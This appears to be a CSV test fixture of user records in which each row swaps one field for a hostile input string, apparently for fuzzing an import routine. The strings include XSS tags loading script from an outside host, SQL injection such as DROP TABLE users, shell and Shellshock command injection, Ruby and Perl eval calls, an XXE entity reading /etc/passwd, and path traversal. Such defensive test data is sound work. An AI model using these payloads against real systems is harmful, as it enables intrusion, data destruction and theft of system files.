"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>"
"<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>"
"<<SCRIPT>alert("XSS");//<</SCRIPT>","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<<SCRIPT>alert("XSS");//<</SCRIPT>","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<<SCRIPT>alert("XSS");//<</SCRIPT>","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<<SCRIPT>alert("XSS");//<</SCRIPT>","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<<SCRIPT>alert("XSS");//<</SCRIPT>","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<<SCRIPT>alert("XSS");//<</SCRIPT>"
"<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >"
"<SCRIPT SRC=//ha.ckers.org/.j>","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<SCRIPT SRC=//ha.ckers.org/.j>","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<SCRIPT SRC=//ha.ckers.org/.j>","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<SCRIPT SRC=//ha.ckers.org/.j>","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<SCRIPT SRC=//ha.ckers.org/.j>","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<SCRIPT SRC=//ha.ckers.org/.j>"
"<IMG SRC="javascript:alert('XSS')"","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<IMG SRC="javascript:alert('XSS')"","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<IMG SRC="javascript:alert('XSS')"","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<IMG SRC="javascript:alert('XSS')"","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<IMG SRC="javascript:alert('XSS')"","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<IMG SRC="javascript:alert('XSS')""
"<iframe src=http://ha.ckers.org/scriptlet.html <","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<iframe src=http://ha.ckers.org/scriptlet.html <","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<iframe src=http://ha.ckers.org/scriptlet.html <","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<iframe src=http://ha.ckers.org/scriptlet.html <","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<iframe src=http://ha.ckers.org/scriptlet.html <","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<iframe src=http://ha.ckers.org/scriptlet.html <"
"\";alert('XSS');//","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","\";alert('XSS');//","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","\";alert('XSS');//","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","\";alert('XSS');//","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","\";alert('XSS');//","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","\";alert('XSS');//"
"<plaintext>","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<plaintext>","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<plaintext>","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<plaintext>","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<plaintext>","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<plaintext>"
"http://a/%%30%30","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","http://a/%%30%30","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","http://a/%%30%30","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","http://a/%%30%30","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","http://a/%%30%30","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","http://a/%%30%30"
"1;DROP TABLE users","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","1;DROP TABLE users","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","1;DROP TABLE users","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","1;DROP TABLE users","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","1;DROP TABLE users","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","1;DROP TABLE users"
"1'; DROP TABLE users-- 1","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","1'; DROP TABLE users-- 1","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","1'; DROP TABLE users-- 1","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","1'; DROP TABLE users-- 1","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","1'; DROP TABLE users-- 1","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","1'; DROP TABLE users-- 1"
"' OR 1=1 -- 1","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","' OR 1=1 -- 1","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","' OR 1=1 -- 1","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","' OR 1=1 -- 1","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","' OR 1=1 -- 1","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","' OR 1=1 -- 1"
"' OR '1'='1","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","' OR '1'='1","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","' OR '1'='1","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","' OR '1'='1","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","' OR '1'='1","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","' OR '1'='1"
" ","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe"," ","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs"," ","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com"," ","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg"," ","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf"," "
"%","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","%","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","%","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","%","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","%","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","%"
"_","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","_","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","_","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","_","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","_","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","_"
"-","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","-","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","-","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","-","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","-","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","-"
"--","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","--","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","--","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","--","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","--","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","--"
"--version","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","--version","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","--version","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","--version","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","--version","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","--version"
"--help","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","--help","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","--help","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","--help","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","--help","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","--help"
"$USER","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","$USER","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","$USER","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","$USER","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","$USER","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","$USER"
"/dev/null; touch /tmp/blns.fail ; echo","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","/dev/null; touch /tmp/blns.fail ; echo","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","/dev/null; touch /tmp/blns.fail ; echo","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","/dev/null; touch /tmp/blns.fail ; echo","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","/dev/null; touch /tmp/blns.fail ; echo","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","/dev/null; touch /tmp/blns.fail ; echo"
"`touch /tmp/blns.fail`","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","`touch /tmp/blns.fail`","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","`touch /tmp/blns.fail`","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","`touch /tmp/blns.fail`","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","`touch /tmp/blns.fail`","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","`touch /tmp/blns.fail`"
"$(touch /tmp/blns.fail)","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","$(touch /tmp/blns.fail)","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","$(touch /tmp/blns.fail)","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","$(touch /tmp/blns.fail)","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","$(touch /tmp/blns.fail)","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","$(touch /tmp/blns.fail)"
"@{[system "touch /tmp/blns.fail"]}","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","@{[system "touch /tmp/blns.fail"]}","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","@{[system "touch /tmp/blns.fail"]}","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","@{[system "touch /tmp/blns.fail"]}","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","@{[system "touch /tmp/blns.fail"]}","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","@{[system "touch /tmp/blns.fail"]}"
"eval("puts 'hello world'")","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","eval("puts 'hello world'")","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","eval("puts 'hello world'")","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","eval("puts 'hello world'")","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","eval("puts 'hello world'")","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","eval("puts 'hello world'")"
"System("ls -al /")","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","System("ls -al /")","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","System("ls -al /")","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","System("ls -al /")","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","System("ls -al /")","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","System("ls -al /")"
"`ls -al /`","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","`ls -al /`","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","`ls -al /`","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","`ls -al /`","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","`ls -al /`","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","`ls -al /`"
"Kernel.exec("ls -al /")","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Kernel.exec("ls -al /")","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","Kernel.exec("ls -al /")","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","Kernel.exec("ls -al /")","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","Kernel.exec("ls -al /")","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","Kernel.exec("ls -al /")"
"Kernel.exit(1)","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Kernel.exit(1)","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","Kernel.exit(1)","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","Kernel.exit(1)","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","Kernel.exit(1)","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","Kernel.exit(1)"
"%x('ls -al /')","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","%x('ls -al /')","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","%x('ls -al /')","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","%x('ls -al /')","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","%x('ls -al /')","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","%x('ls -al /')"
"<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"
"$HOME","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","$HOME","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","$HOME","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","$HOME","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","$HOME","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","$HOME"
"$ENV{'HOME'}","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","$ENV{'HOME'}","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","$ENV{'HOME'}","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","$ENV{'HOME'}","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","$ENV{'HOME'}","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","$ENV{'HOME'}"
"%d","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","%d","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","%d","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","%d","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","%d","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","%d"
"%s","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","%s","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","%s","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","%s","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","%s","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","%s"
"{0}","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","{0}","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","{0}","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","{0}","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","{0}","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","{0}"
"%*.*s","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","%*.*s","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","%*.*s","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","%*.*s","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","%*.*s","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","%*.*s"
"../../../../../../../../../../../etc/passwd%00","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","../../../../../../../../../../../etc/passwd%00","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","../../../../../../../../../../../etc/passwd%00","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","../../../../../../../../../../../etc/passwd%00","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","../../../../../../../../../../../etc/passwd%00","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","../../../../../../../../../../../etc/passwd%00"
"../../../../../../../../../../../etc/hosts","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","../../../../../../../../../../../etc/hosts","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","../../../../../../../../../../../etc/hosts","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","../../../../../../../../../../../etc/hosts","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","../../../../../../../../../../../etc/hosts","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","../../../../../../../../../../../etc/hosts"
"() { 0; }; touch /tmp/blns.shellshock1.fail;","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","() { 0; }; touch /tmp/blns.shellshock1.fail;","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","() { 0; }; touch /tmp/blns.shellshock1.fail;","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","() { 0; }; touch /tmp/blns.shellshock1.fail;","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","() { 0; }; touch /tmp/blns.shellshock1.fail;","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","() { 0; }; touch /tmp/blns.shellshock1.fail;"
"() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }","Joe Bloggs","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }","joe.bloggs@example.com","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }","joe.jpg","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }","php;rdf","alice;bob;claire"
"joe","Joe Bloggs","joe.bloggs@example.com","joe.jpg","() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }","alice;bob;claire"
